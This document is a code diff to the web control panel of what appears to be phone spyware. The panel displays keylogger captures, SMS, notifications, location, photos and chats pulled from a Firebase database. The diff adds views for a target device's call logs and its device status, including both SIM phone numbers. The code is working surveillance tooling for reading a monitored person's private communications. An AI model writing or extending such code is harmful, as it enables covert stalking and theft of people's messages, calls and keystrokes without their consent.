@@ -356,6 +356,41 @@
             z-index: 999;
         }
 
+        /* --- Device Status Styles --- */
+        .status-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+        }
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            background: var(--secondary-dark);
+            padding: 1rem;
+            border-radius: 8px;
+        }
+        .status-item-label { font-weight: 500; }
+        .status-item-value {
+            margin-left: auto;
+            font-weight: 600;
+        }
+        .status-item-value.on { color: var(--accent-green); }
+        .status-item-value.off { color: var(--accent-red); }
+        .battery-level {
+            width: 100%;
+            background-color: var(--secondary-dark);
+            border-radius: 5px;
+            height: 20px;
+            overflow: hidden;
+        }
+        .battery-level-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-red), var(--accent-green));
+            border-radius: 5px;
+            transition: width 0.5s ease;
+        }
+
         @media (max-width: 992px) {
             .sidebar {
                 position: fixed;
@@ -444,6 +479,16 @@
                          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#9b59b6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
                         <span>SMS</span>
                     </button>
+                     <!-- नया फीचर: कॉल लॉग्स -->
+                    <button class="category-btn" data-category="calllogs">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#64b5f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                        <span>Call Logs</span>
+                    </button>
+                    <!-- नया फीचर: डिवाइस की स्थिति -->
+                    <button class="category-btn" data-category="devicestatus">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ce93d8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
+                        <span>Device Status</span>
+                    </button>
                     <button class="category-btn" data-category="notifications">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
                         <span>Notifications</span>
@@ -530,7 +575,6 @@
         let selectedUserInfo = {};
         let activeChatListeners = []; 
         
-        // --- NEW: Keylogger Pagination Variables ---
         let fullKeyloggerData = [];
         let renderedKeyloggerCount = 0;
         const KEYLOGGER_BATCH_SIZE = 50;
@@ -569,7 +613,6 @@
                     off(activeDataListener.ref, 'value', activeDataListener.callback);
                     activeDataListener = null;
                 }
-                // --- NEW: Clean up keylogger listener and data ---
                 modalDataDisplayArea.removeEventListener('scroll', handleKeyloggerScroll);
                 fullKeyloggerData = [];
                 renderedKeyloggerCount = 0;
@@ -776,14 +819,12 @@
             
             document.getElementById('modal-title').textContent = `${category.charAt(0).toUpperCase() + category.slice(1)} Data`;
 
-            // --- UPDATED: Handle different categories ---
             if (category === 'photo') { renderPhotosFromStorage(userId, childKey); return; }
             if (category === 'chat') { renderChat(userId, childKey); return; }
             
             const dataPath = `user/${userId}/${childKey}/${getCategoryPath(category)}`;
             const dataRef = ref(db, dataPath);
             const callback = (snapshot) => { 
-                // --- UPDATED: Route keylogger to its own function ---
                 if (category === 'keylogger') {
                     setupKeyloggerDisplay(snapshot.val());
                 } else {
@@ -795,7 +836,6 @@
             activeDataListener = { ref: dataRef, callback: callback };
         }
         
-        // --- NEW: Keylogger Pagination Functions ---
         function handleKeyloggerScroll() {
             if (modalDataDisplayArea.scrollTop + modalDataDisplayArea.clientHeight >= modalDataDisplayArea.scrollHeight - 20) {
                 renderKeyloggerBatch();
@@ -901,13 +941,14 @@
             let headerHTML = '';
             let contentHTML = '';
             const hasData = data && typeof data === 'object' && Object.keys(data).length > 0;
-            if (category !== 'location' && hasData) {
+            if (category !== 'location' && category !== 'devicestatus' && hasData) {
                 headerHTML = `<div class="data-header"><button class="clear-category-btn" data-category="${category}"><span>Clear ${category} Data</span></button></div>`;
             }
             if (!hasData) {
                 contentHTML = '<p>No data available in this category.</p>';
             } else {
-                 switch(category) {
+                const dataArray = (category !== 'devicestatus' && category !== 'location') ? Object.values(data).reverse() : [];
+                switch(category) {
                     case 'location':
                         let mapLink = '';
                         if (data.latitude && data.longitude) {
@@ -927,7 +968,7 @@
                         break;
                     case 'sms':
                         contentHTML = '<div class="sms-card-list">';
-                        Object.values(data).reverse().forEach(sms => {
+                        dataArray.forEach(sms => {
                             if (sms) {
                                 const isOutgoing = sms.type === 2;
                                 const cardClass = isOutgoing ? 'outgoing' : 'incoming';
@@ -940,7 +981,7 @@
                         break;
                     case 'notifications':
                          contentHTML = '<div class="notification-list">';
-                         Object.values(data).reverse().forEach(notif => {
+                         dataArray.forEach(notif => {
                              if (notif) {
                                  let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`;
                                  const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase();
@@ -950,6 +991,80 @@
                          });
                          contentHTML += '</div>';
                          break;
+                    case 'calllogs':
+                        contentHTML = '<div class="sms-card-list">'; // Reusing SMS styles for consistency
+                        dataArray.forEach(call => {
+                            if (call) {
+                                let icon, title, cardClass;
+                                switch (String(call.type).toUpperCase()) {
+                                    case 'INCOMING':
+                                        icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 11 12 14 22 4"></polyline><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path></svg>`;
+                                        title = `Incoming Call`;
+                                        cardClass = 'incoming';
+                                        break;
+                                    case 'OUTGOING':
+                                        icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>`;
+                                        title = `Outgoing Call`;
+                                        cardClass = 'outgoing';
+                                        break;
+                                    case 'MISSED':
+                                    default:
+                                        icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>`;
+                                        title = `Missed Call`;
+                                        cardClass = '';
+                                        break;
+                                }
+                                contentHTML += `<div class="sms-card ${cardClass}"><div class="sms-card-header"><div class="sms-card-icon">${icon}</div><div class="sms-card-address">${title}</div></div><div class="sms-card-body"><strong>Number:</strong> ${call.phoneNumber || 'N/A'}<br><strong>Duration:</strong> ${call.duration || '0'}s</div><div class="sms-card-footer">${new Date(call.date).toLocaleString() || ''}</div></div>`;
+                            }
+                        });
+                        contentHTML += '</div>';
+                        break;
+                    case 'devicestatus':
+                        const status = data;
+                        contentHTML = `
+                            <div class="data-card">
+                                 <div class="sms-card-header" style="margin-bottom: 2rem;">
+                                    <div class="sms-card-icon">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                                    </div>
+                                    <div class="sms-card-address">Current Device Status</div>
+                                </div>
+                                <div class="data-card-body">
+                                    <div class="status-item" style="flex-direction: column; align-items: flex-start; gap: 0.5rem; padding-bottom: 1.5rem; background: transparent;">
+                                        <div style="width:100%; display:flex; justify-content: space-between;">
+                                            <span class="status-item-label">Battery</span>
+                                            <span class="status-item-value">${status.batteryLevel || 'N/A'}%</span>
+                                        </div>
+                                        <div class="battery-level">
+                                            <div class="battery-level-fill" style="width: ${status.batteryLevel || 0}%;"></div>
+                                        </div>
+                                    </div>
+                                    <div class="status-grid">
+                                        <div class="status-item">
+                                            <span class="status-item-label">Internet</span>
+                                            <span class="status-item-value ${status.internetOn ? 'on' : 'off'}">${status.internetOn ? 'On' : 'Off'}</span>
+                                        </div>
+                                        <div class="status-item">
+                                            <span class="status-item-label">Network Type</span>
+                                            <span class="status-item-value">${status.networkType || 'N/A'}</span>
+                                        </div>
+                                        <div class="status-item">
+                                            <span class="status-item-label">SIM Operator</span>
+                                            <span class="status-item-value">${status.simOperator || 'N/A'}</span>
+                                        </div>
+                                        <div class="status-item">
+                                            <span class="status-item-label">SIM 1</span>
+                                            <span class="status-item-value">${status.sim1Number || 'N/A'}</span>
+                                        </div>
+                                        <div class="status-item">
+                                            <span class="status-item-label">SIM 2</span>
+                                            <span class="status-item-value">${status.sim2Number || 'N/A'}</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="data-card-footer">Last updated: ${new Date(status.lastUpdated).toLocaleString() || 'N/A'}</div>
+                            </div>`;
+                        break;
                  }
             }
             modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
@@ -974,7 +1089,6 @@
             } catch (error) { console.error("Error fetching photos:", error); modalDataDisplayArea.innerHTML = headerHTML + `<p>Error loading photos. (Error Code: ${error.code})</p>`; }
         }
 
-        // --- NEW: Universal event listener for modal buttons ---
         modalDataDisplayArea.addEventListener('click', (e) => {
             const button = e.target.closest('button');
             if (!button) return;
@@ -1025,6 +1139,8 @@
                 case 'keylogger': return 'keyLogger/data';
                 case 'sms': return 'sms/data';
                 case 'notifications': return 'notificationsMessages/data';
+                case 'calllogs': return 'Calls';
+                case 'devicestatus': return 'DeviceStatus';
                 default: return '';
             }
         }
